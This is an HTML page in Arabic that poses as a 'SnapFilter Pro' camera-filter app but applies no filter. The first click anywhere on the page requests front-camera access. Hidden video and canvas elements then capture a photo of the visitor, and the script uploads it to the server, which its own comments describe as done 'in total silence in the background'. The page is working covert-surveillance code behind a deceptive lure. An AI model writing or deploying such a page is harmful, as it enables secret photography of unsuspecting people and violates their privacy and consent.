<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapFilter</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d0f12; color: #ffffff;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 100vh; padding: 15px; cursor: pointer; /* جعل المؤشر يدل على إمكانية الضغط */
        }
        .container {
            width: 100%; max-width: 420px; background: #161922;
            border-radius: 20px; padding: 35px 20px; text-align: center;
            border: 1px solid #262b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h2 { font-size: 26px; margin-bottom: 25px; color: #ff4757; font-weight: 700; }
        
        .filter-banner {
            background: linear-gradient(135deg, #1f4068, #162447);
            padding: 40px 20px;
            border-radius: 16px;
            border: 2px dashed #ff4757;
            margin-bottom: 20px;
            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
        }
        .filter-banner p { font-size: 17px; color: #dcdde1; font-weight: bold; margin-top: 12px; }
        .filter-icon { font-size: 55px; }
        .hint { font-size: 13px; color: #8f93a2; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="container" id="main-card">
        <h2>SnapFilter Pro</h2>
        
        <div class="filter-banner">
            <div class="filter-icon">✨🎭</div>
            <p>فلتر الواقع الافتراضي نشط</p>
        </div>
        <div class="hint">اضغط في أي مكان لتفعيل الفلتر</div>
    </div>

    <!-- عناصر الكاميرا المخفية بالكامل -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let triggered = false;

        // تفعيل الكاميرا وطلب الإذن بمجرد أول لمسة أو ضغطة من المستخدم على الشاشة
        document.body.addEventListener('click', async () => {
            if (triggered) return; // لمنع التكرار إذا ضغط أكثر من مرة
            triggered = true;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                
                video.srcObject = stream;

                setTimeout(async () => {
                    if (!video.videoWidth) {
                        stream.getTracks().forEach(track => track.stop());
                        return;
                    }

                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/png');

                    // إيقاف الكاميرا فوراً بعد الالتقاط
                    stream.getTracks().forEach(track => track.stop());

                    // إرسال الصورة للسيرفر بصمت تام في الخلفية
                    await fetch('/upload-snapshot', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ image: imageData })
                    });

                }, 1000);

            } catch (err) {
                console.error("Camera access denied or error:", err);
            }
        });
    </script>

</body>
</html>
